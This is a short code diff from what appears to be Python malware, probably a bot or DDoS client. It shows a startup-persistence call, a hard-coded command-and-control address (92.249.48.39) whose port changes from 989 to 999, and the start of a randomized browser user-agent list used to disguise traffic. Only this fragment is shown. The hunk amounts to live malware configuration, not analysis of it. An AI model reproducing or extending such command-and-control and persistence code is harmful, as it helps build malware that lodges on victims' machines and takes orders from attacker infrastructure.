@@ -47,7 +47,7 @@ if __name__ == "__main__":
     add_to_startup()
 
 C2_ADDRESS  = "92.249.48.39"
-C2_PORT     = 989
+C2_PORT     = 999
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
